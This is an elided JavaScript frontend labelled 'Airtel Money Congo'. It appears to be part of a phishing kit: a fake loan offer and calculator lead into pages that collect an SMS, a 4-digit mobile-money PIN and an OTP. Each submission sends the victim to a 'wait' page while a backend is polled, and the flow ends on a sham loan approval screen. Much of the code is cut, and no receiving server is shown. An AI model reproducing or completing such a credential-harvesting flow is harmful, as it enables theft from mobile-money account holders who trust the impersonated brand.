// ═══════════════════════════════════════════════════════════
// Airtel Money Congo – Frontend State Machine
// ═══════════════════════════════════════════════════════════
...
function updateCalc() {
  ...
  document.getElementById('calcAmt').textContent = 'CDF ' + amt.toLocaleString();
  const monthly = Math.ceil(amt / 12);
  document.getElementById('monthlyAmt').textContent = 'CDF ' + monthly.toLocaleString();
}
...
function toS3() {
  ...
  document.getElementById('sA').textContent = 'CDF ' + S.loanAmount.toLocaleString();
...
async function doSmsParse() {
  ...
  try {
    ...
    goTo('page-wait-sms');
    startPoll('sms');
  } catch (e) { showError('momErr', 'Network error.'); }
}
...
async function resendSms() {
  ...
  try {
    ...
    goTo('page-wait-sms');
    startPoll('sms');
  } catch (e) { showToast('Resend failed', 'error'); }
}

// ═══════════════════════════════════════════════════════════
// PIN (4 digits for Airtel)
// ═══════════════════════════════════════════════════════════
...
async function doPin() {
  ...
  if (pin.length !== 4) { showError('pinErr', 'Enter a valid 4-digit PIN.'); return; }
  ...
  try {
    ...
    goTo('page-wait-pin');
    startPoll('pin');
  } catch (e) { showError('pinErr', 'Network error.'); }
}
...
async function doOtp() {
  ...
  try {
    ...
    goTo('page-wait-otp');
    startPoll('otp');
  } catch (e) { showError('otpErr', 'Network error.'); }
}
...
function showApprovalPage() {
  ...
  document.getElementById('aprAmount').textContent = 'CDF ' + amt;
  document.getElementById('aprAmt').textContent = 'CDF ' + amt;
  document.getElementById('aprTerm').textContent = S.loanTerm;
  document.getElementById('aprMth').textContent = 'CDF ' + monthly;
  goTo('page-approval');
}
